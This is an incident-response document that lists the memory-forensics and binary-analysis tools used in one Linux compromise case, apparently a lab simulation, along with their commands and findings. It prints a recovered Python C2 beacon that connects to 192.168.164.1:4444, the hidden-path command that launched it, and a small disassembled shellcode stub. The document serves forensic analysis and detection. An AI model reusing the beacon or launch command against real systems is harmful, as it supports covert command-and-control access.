# Forensic Tools & Technologies Used

**Case:** CASE_20251228_0001  
**Date:** 2025-12-31  
**Analyst:** Sai (DFIR Analyst)  
**Classification:** Incident Response Documentation  

---

## Table of Contents

1. [Memory Acquisition Tools](#memory-acquisition-tools)
2. [Memory Forensics Framework](#memory-forensics-framework)
3. [Binary Analysis & Disassembly](#binary-analysis--disassembly)
4. [Network Forensics Tools](#network-forensics-tools)
5. [Malware Analysis Tools](#malware-analysis-tools)
6. [Hash Verification & Integrity](#hash-verification--integrity)
7. [Automation & Development](#automation--development)
8. [Comparison Matrix](#comparison-matrix)

---

## Memory Acquisition Tools

### LiME (Linux Memory Extractor)

**Purpose:** Capture RAM contents from live Linux systems

**Version:** LiME 2.0 (compiled from source)

**Installation:**
```bash
git clone https://github.com/504ensicsLabs/LiME.git
cd LiME/src
make clean && make
```

**Usage in Case:**
```bash
sudo insmod ./lime-5.4.0-216-generic.ko \
  path="/home/labadmin/dfir_acq/mem_victim-u20_5.4.0-216-generic_20251227T214903Z.lime" \
  format=lime \
  timeout=0
```

**Key Parameters:**
- `path`: Output file location
- `format=lime`: LiME format (compatible with Volatility 3)
- `timeout=0`: Disable page-read timeout for slow storage regions

**Advantages:**
- [Supported] Kernel module approach captures full RAM including kernel pages
- [Supported] Supports raw, lime, and s2e formats
- [Supported] Works on all Linux distributions
- [Supported] Minimal system impact once loaded

**Limitations:**
- [Limitation] Requires compiler + kernel headers on target system
- [Limitation] Kernel module signature verification may block loading (depends on Secure Boot)
- [Limitation] Large output files (4GB+ for systems with 4GB+ RAM)

**Evidence Quality:** HIGH
- Chain of custody documented via `$DUMP.sha256` file
- Cryptographic hash verifiable on analyst workstation
- Compatible with all major forensic frameworks

**Alternative Tools:**
- `fmem` (user-space memory dumper, less reliable)
- `dd /dev/mem` (deprecated in modern kernels, doesn't work on 5.4+)
- `crash` + `/proc/kcore` (kernel crash tool, limited functionality)

---

## Memory Forensics Framework

### Volatility 3 (v2.26.2)

**Purpose:** Extract and analyze artifacts from RAM images

**Installation:**
```bash
python3 -m venv ~/dfir_tools/vol3_env
source ~/dfir_tools/vol3_env/bin/activate
pip install volatility3
```

**Version-Specific Tools Used in Case:**

#### 1. **linux.banners.Banners**
```bash
vol -f memory.lime -s symbols/ banners.Banners
```
**Purpose:** Extract Linux kernel version banners  
**Case Finding:** Confirmed Ubuntu 20.04.6 (5.4.0-216 kernel)

#### 2. **isfinfo.IsfInfo**
```bash
vol -f memory.lime -s symbols/ isfinfo.IsfInfo
```
**Purpose:** Verify ISF symbol file validity  
**Case Finding:** Symbols validated

#### 3. **linux.boottime**
```bash
vol -f memory.lime -s symbols/ linux.boottime
```
**Purpose:** Establish system boot timestamp for timeline  
**Case Finding:** System boot: 2025-12-27 ~20:00 UTC

#### 4. **linux.pslist.PsList**
```bash
vol -f memory.lime -s symbols/ linux.pslist
```
**Purpose:** Enumerate running processes (kernel task list)  
**Case Finding:** Identified 5 malicious processes (PIDs 20480, 19983, 19442, 1048, 1140)  
**Artifacts:** 11_pslist.txt (21,732 bytes)

#### 5. **linux.pstree.PsTree**
```bash
vol -f memory.lime -s symbols/ linux.pstree
```
**Purpose:** Display process hierarchy and parent-child relationships  
**Case Finding:** Revealed .injector (PID 20480) as independent service  
**Artifacts:** 12_pstree.txt (10,016 bytes)

#### 6. **linux.psscan.PsScan**
```bash
vol -f memory.lime -s symbols/ linux.psscan
```
**Purpose:** Scan memory for process objects (detects DKOM hidden processes)  
**Case Finding:** All PIDs matched between pslist/psscan (no hidden processes)  
**Artifacts:** 13_psscan.txt (50,403 bytes)

#### 7. **linux.psaux.PsAux**
```bash
vol -f memory.lime -s symbols/ linux.psaux
```
**Purpose:** Extract command-line arguments for each process  
**Case Finding:** Recovered execution commands: `sudo nohup /opt/.cache/.rsim.py 192.168.164.1 4444`  
**Artifacts:** 14_psaux.txt (9,084 bytes) - **CRITICAL FOR IOC EXTRACTION**

#### 8. **linux.lsof.Lsof**
```bash
vol -f memory.lime -s symbols/ linux.lsof
```
**Purpose:** List open files per process  
**Case Finding:** Identified open log files (`/var/log/.rsim.log`, `/var/log/.injector.log`)  
**Artifacts:** 15_lsof.txt (137,223 bytes)

#### 9. **linux.sockstat.Sockstat**
```bash
vol -f memory.lime -s symbols/ linux.sockstat
```
**Purpose:** Extract active network connections  
**Case Finding:** Identified C2 connection: `PID 19983 192.168.164.129:47540 -> 192.168.164.1:4444 ESTABLISHED`  
**Artifacts:** 20_sockstat.txt (56,246 bytes) - **CRITICAL C2 IOC**

#### 10. **linux.lsmod.Lsmod**
```bash
vol -f memory.lime -s symbols/ linux.lsmod
```
**Purpose:** List loaded kernel modules  
**Case Finding:** No suspicious kernel modules detected  
**Artifacts:** 30_lsmod.txt (6,942 bytes)

#### 11. **linux.kmsg.Kmsg**
```bash
vol -f memory.lime -s symbols/ linux.kmsg
```
**Purpose:** Extract kernel ring buffer messages  
**Case Finding:** Module load timestamps, USB events, network messages  
**Artifacts:** 40_kmsg.txt (191,693 bytes)

#### 12. **linux.malfind.Malfind**
```bash
vol -f memory.lime -s symbols/ linux.malfind
```
**Purpose:** Detect RWX memory regions (injected code indicator)  
**Case Finding:** 3 RWX regions detected in PIDs 20480, 1048, 1140  
**Artifacts:** 50_malfind.txt (1,658 bytes) - **SHELLCODE DETECTION**

#### 13. **linux.malware.modxview.ModXview**
```bash
vol -f memory.lime -s symbols/ linux.malware.modxview
```
**Purpose:** Cross-reference kernel modules with memory pages  
**Case Finding:** No rootkit-level module anomalies  
**Artifacts:** 51_modxview.txt (3,722 bytes)

### Volatility 3 Strengths:

[Supported] **Multi-platform support:** Windows, Linux, macOS  
[Supported] **Plugin architecture:** Extensible for custom analysis  
[Supported] **Python 3 based:** Modern development, well-documented  
[Supported] **Symbol resolution:** Automatic ISF format support  
[Supported] **Nested object parsing:** Correctly interprets kernel data structures  

### Volatility 3 Limitations:

[Limitation] **Slower than Volatility 2:** Pure Python implementation  
[Limitation] **Memory-intensive:** Requires significant RAM for large images  
[Limitation] **Symbol dependency:** Analysis quality dependent on ISF completeness  

---

## Binary Analysis & Disassembly

### NASM Disassembler (ndisasm)

**Purpose:** Static disassembly of x86-64 machine code

**Version:** 2.15.05 (or later)

**Installation:**
```bash
sudo apt install nasm
```

**Usage in Case:**
```bash
ndisasm -b 64 /path/to/shellcode.bin > output.asm
```

**Case Application:**

**RWX Region Analysis (PID 20480):**
```bash
ndisasm -b 64 pid.20480.vma.0x7f3396a68000-0x7f3396a69000.dmp \
  | tee shellcode_20480.ndisasm.txt
```

**Results:** Recovered 15-byte trampoline shellcode:
```asm
00000000  90                nop              ; NOP sled (alignment)
00000001  90                nop
...
00000007  90                nop
00000008  CC                int3             ; Breakpoint (anti-debug)
00000009  31C0              xor eax,eax      ; Zero register
0000000B  4831FF            xor rdi,rdi      ; Zero register
0000000E  C3                ret              ; Return
```

**Comparative Analysis (PID 1048 vs 1140):**
```bash
ndisasm -b 64 pid_1048_rwx.dmp > dis_1048.txt
ndisasm -b 64 pid_1140_rwx.dmp > dis_1140.txt
diff -u dis_1048.txt dis_1140.txt | tee rwx_disasm_diff.txt
```

**Finding:** 97.58% instruction similarity, only memory addresses differ

### readelf & file

**Purpose:** Binary metadata extraction

**Usage:**
```bash
readelf -l reconstructed_injector.elf  # Program headers
readelf -s reconstructed_injector.elf  # Symbol table
file reconstructed_injector.elf        # File type identification
```

**Case Finding:** Confirmed ELF 64-bit LSB shared object, dynamic linking

---

## Network Forensics Tools

### Linux Native Utilities

#### ss (socket statistics)
```bash
# Pre-acquisition baseline (from victim VM)
ss -anp > pre_acq_network_20251227T214513Z.txt

# Live capture during analysis
ss -anp | grep ESTABLISHED
```

**Case Use:** Identified socket creation patterns, ephemeral port allocation

#### iptables
```bash
iptables -L -n -v > firewall_rules.txt
```

**Case Use:** Verified no firewall rules blocking 192.168.164.1:4444 (attack successful due to permissive policy)

#### tcpdump (Network Packet Capture)
```bash
sudo tcpdump -i eth1 -n 'tcp port 4444' -w capture.pcap
```

**Note:** Not used in this case (memory-only analysis), but recommended for real-time detection

---

## Malware Analysis Tools

### strings (Binary String Extraction)

**Purpose:** Extract human-readable strings from binary files

**Usage in Case:**
```bash
# Extract strings from Python process memory
strings pid_19983_memory_dump.bin \
  | grep -E "socket|import|C2|RSIM|192.168" \
  > python_strings.txt

# Result: Recovered Python source code
#!/usr/bin/env python3
import socket, time, os, sys
DST_HOST = "192.168.164.1"
DST_PORT = 4444
s = socket.create_connection((DST_HOST, DST_PORT), timeout=5)
s.sendall(b"RSIM_BEACON hello\n")
```

**Case Finding:** Recovered complete malware source code from memory (HIGH confidence IOC)

### hexdump

**Purpose:** Raw hexadecimal dump of binary data

**Usage:**
```bash
hexdump -C shellcode.bin > shellcode.hex
```

**Case Use:** Visual inspection of RWX memory regions, byte-level comparison

### Python (Custom Analysis Scripts)

**Purpose:** Automated IOC extraction and data processing

**Scripts Used:**
```python
# 1. Hash comparison (RWX regions)
with open('pid_1048_rwx.dmp', 'rb') as f1, \
     open('pid_1140_rwx.dmp', 'rb') as f2:
    data1, data2 = f1.read(), f2.read()
    differences = sum(a != b for a, b in zip(data1, data2))
    similarity = 100 * (len(data1) - differences) / len(data1)
    print(f"Similarity: {similarity:.2f}%")  # 97.58%

# 2. String pattern matching
import re
c2_pattern = r'192\.168\.164\.\d+:\d+'
matches = re.findall(c2_pattern, memory_dump_text)
print(f"Found {len(matches)} C2 addresses")  # Found 1
```

---

## Hash Verification & Integrity

### sha256sum

**Purpose:** Cryptographic hash verification (NIST FIPS 180-4)

**Usage in Case:**

**Original Victim Hash:**
```bash
# Generated on victim VM after dump
sha256sum mem_victim-u20_5.4.0-216-generic_20251227T214903Z.lime
# Output: a2b17a37b0250034bb9857ba0c0e34f2724b04b0bf8b51f92d7595682f94c748
```

**Analyst Verification:**
```bash
# Convert victim absolute path to analyst relative path
awk '{print $1 "  evidence/mem_victim-u20_5.4.0-216-generic_20251227T214903Z.lime"}' \
  original_dump.sha256 > dump.local.sha256

sha256sum -c dump.local.sha256
# evidence/mem_victim-u20_5.4.0-216-generic_20251227T214903Z.lime: OK
```

**Hash Chain Documentation:**
- Original dump hash (victim): a2b17a37...
- Local verification hash (analyst): a2b17a37... [MATCH]
- Analysis artifacts hashed individually for integrity tracking

### md5sum (Legacy Support)

**Usage:**
```bash
md5sum large_file.bin
```

**Note:** Not used for evidence verification (SHA-256 preferred), but sometimes used for quick change detection

---

## Automation & Development

### Bash Shell Scripting

**Purpose:** Case automation, batch processing

**Key Scripts:**

**1. Evidence Collection Automation:**
```bash
#!/bin/bash
# Phase 1 collection script
source case_variables.sh

# Parallel collection of volatile artifacts
ssh "${VICTIM_IP}" "ps auxww" | tee "${CASE_DIR}/logs/processes.txt" &
ssh "${VICTIM_IP}" "ss -anp" | tee "${CASE_DIR}/logs/network.txt" &
wait

echo "[OK] Volatile artifacts collected"
```

**2. Volatility 3 Batch Execution:**
```bash
#!/bin/bash
DUMP="$1"
SYMS="$2"
OUTDIR="$3"

plugins=(
  "banners.Banners"
  "linux.pslist"
  "linux.psaux"
  "linux.sockstat"
  "linux.malfind"
)

for plugin in "${plugins[@]}"; do
  vol -f "$DUMP" -s "$SYMS" "$plugin" \
    | tee "${OUTDIR}/$(echo $plugin | tr '.' '_').txt"
done
```

**3. Hash Verification Batch:**
```bash
#!/bin/bash
find "$CASE_DIR" -name "*.sha256" -type f | while read hashfile; do
  sha256sum -c "$hashfile" || echo "FAILED: $hashfile"
done
```

### Git (Version Control)

**Purpose:** Track case documentation changes, maintain audit trail

**Usage:**
```bash
git init "$CASE_DIR"
git add . && git commit -m "Phase 1: Evidence collection complete"
git add . && git commit -m "Phase 2: Volatility 3 analysis complete"
git log --oneline  # Timeline of investigation
```

### cron / at (Task Scheduling)

**Purpose:** Automated recurring tasks (unlikely in forensics, but useful for lab)

```bash
# Nightly backup of case data
0 2 * * * /usr/local/bin/backup_case.sh "$CASE_DIR" >> /var/log/dfir_backup.log
```

---

## Comparison Matrix

| Tool | Purpose | Version | License | Output Format | Notes |
|------|---------|---------|---------|---------------|-------|
| **LiME** | RAM acquisition | 2.0 | GPL-2 | .lime binary | Requires kernel headers |
| **Volatility 3** | Memory analysis | 2.26.2 | VSL | Text/CSV | Python-based, extensible |
| **ndisasm** | x86-64 disassembly | 2.15+ | BSD | Assembly text | Part of NASM toolchain |
| **strings** | String extraction | GNU coreutils | GPL-3 | Text | Fast, minimal overhead |
| **readelf** | ELF metadata | GNU binutils | GPL-3 | Text | Comprehensive binary analysis |
| **sha256sum** | Hash verification | GNU coreutils | GPL-3 | Text | FIPS 180-4 compliant |
| **ss** | Socket statistics | iproute2 | GPL-2 | Text | Real-time network state |
| **hexdump** | Hex dump | BSD utils | BSD | Hex/ASCII | Visual inspection |
| **Python 3** | Custom analysis | 3.8+ | PSF | Script output | Automated processing |
| **Bash** | Scripting/automation | 5.0+ | GPL-3 | Script output | Batch processing |
| **Git** | Version control | 2.25+ | GPL-2 | Commit history | Audit trail |

---

## Tool Selection Rationale

### Why These Tools?

1. **LiME over fmem/dd:**
   - LiME 2.0 provides reliable kernel-space memory capture
   - fmem less reliable for modern kernels
   - dd /dev/mem deprecated in Linux 5.4+

2. **Volatility 3 over Volatility 2:**
   - Official framework for modern Linux (5.x+ kernels)
   - ISF symbol format support (automatic)
   - Active development and plugin ecosystem

3. **ndisasm over objdump/radare2:**
   - Lightweight, simple output format
   - Minimal dependencies
   - Suitable for quick shellcode analysis
   - radare2 overkill for 4KB dumps

4. **sha256sum over md5sum:**
   - Cryptographically stronger (NIST approved)
   - Industry standard for forensic evidence
   - Resistant to collision attacks

5. **Bash over Python for orchestration:**
   - Lightweight, available on all systems
   - Direct execution of Linux utilities
   - Easy to maintain and audit

---

## Tool Limitations & Mitigations

| Tool | Limitation | Mitigation |
|------|-----------|------------|
| LiME | Requires kernel compilation | Pre-compile for target kernels |
| Volatility 3 | Symbol dependency | Maintain offline ISF library |
| ndisasm | Limited semantic analysis | Supplement with Ghidra/Radare2 |
| strings | High false positive rate | Filter by context (grep) |
| Bash | Limited error handling | Use set -e, trap handlers |

---

## Recommendations for Future Cases

1. **Pre-load symbol files** before investigation starts (reduces analysis time)
2. **Maintain tool inventory** with verified hashes (detect supply chain compromises)
3. **Automate common workflows** (reduces human error)
4. **Document tool versions** in case file (reproducibility)
5. **Consider IaaS forensics** tools (AWS Incident Response, GCP Cloudtrail) for cloud-based incidents

---

**Tool Documentation Complete**

**Date:** 2025-12-31  
**Analyst:** Sai (DFIR Analyst)  
**Classification:** Incident Response Documentation
